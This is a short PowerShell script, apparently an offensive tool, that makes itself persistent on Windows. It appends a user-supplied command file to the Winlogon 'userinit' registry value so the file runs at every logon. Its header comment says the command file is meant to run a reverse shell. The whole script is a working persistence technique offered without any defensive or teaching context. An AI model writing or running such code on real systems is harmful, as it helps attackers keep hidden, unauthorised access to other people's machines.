<# 
 # Persistense
 # (Example) .\Set-UserinitRegistryValue.ps1 -shellCmdPath "C:\{path}\test.cmd" 
 # `test.cmd --> execute Reverse Shell or ..`
#>

param(
    [string]$shellCmdPath = $null
)

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
$regName = "userinit"

if ($shellCmdPath -ne $null) {
    $regValue = "C:\Windows\system32\userinit.exe,$shellCmdPath"
} else {
    $regValue = "C:\Windows\system32\userinit.exe"
}

Set-ItemProperty -Path $regPath -Name $regName -Value $regValue

Write-Host "Change Registry Value -> $regValue\n"

# Reboot
